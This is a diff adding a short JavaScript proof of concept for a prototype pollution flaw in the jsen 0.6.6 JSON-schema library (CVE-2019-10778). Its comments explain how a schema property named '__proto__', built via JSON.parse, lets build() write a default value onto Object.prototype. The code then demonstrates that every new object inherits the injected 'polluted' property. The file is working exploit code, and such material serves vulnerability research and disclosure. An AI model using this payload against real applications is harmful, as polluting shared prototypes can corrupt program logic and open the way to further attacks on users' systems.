@@ -1,0 +1,30 @@
+```javascript
+// Prototype Pollution in jsen 0.6.6 (CVE-2019-10778)
+// jsen's build() walks schema.properties and does:
+//   defValue = build(schema.properties[key], def[key], ...)
+//   def[key] = defValue
+// If a schema declares a "__proto__" property, then for a plain object
+// def (e.g. {}), the "get" of def["__proto__"] returns the REAL
+// Object.prototype reference (not a copy). Recursing into it and writing
+// a nested "default" value then mutates Object.prototype directly.
+//
+// Note: the malicious schema must be built via JSON.parse (not an object
+// literal), because `{ __proto__: {...} }` as literal syntax is
+// special-cased by the JS spec to set the prototype instead of creating
+// an own property named "__proto__".
+
+const jsen = require("jsen");
+
+const maliciousSchema = {
+  type: "object",
+  properties: JSON.parse(
+    '{"__proto__":{"type":"object","properties":{"polluted":{"type":"boolean","default":true}}}}'
+  )
+};
+
+const validate = jsen(maliciousSchema);
+validate.build({}); // simulates filling in defaults for untrusted input
+
+console.log("polluted on brand-new object:", ({}).polluted); // true
+console.log("polluted on Object.prototype:", Object.prototype.polluted); // true
+```
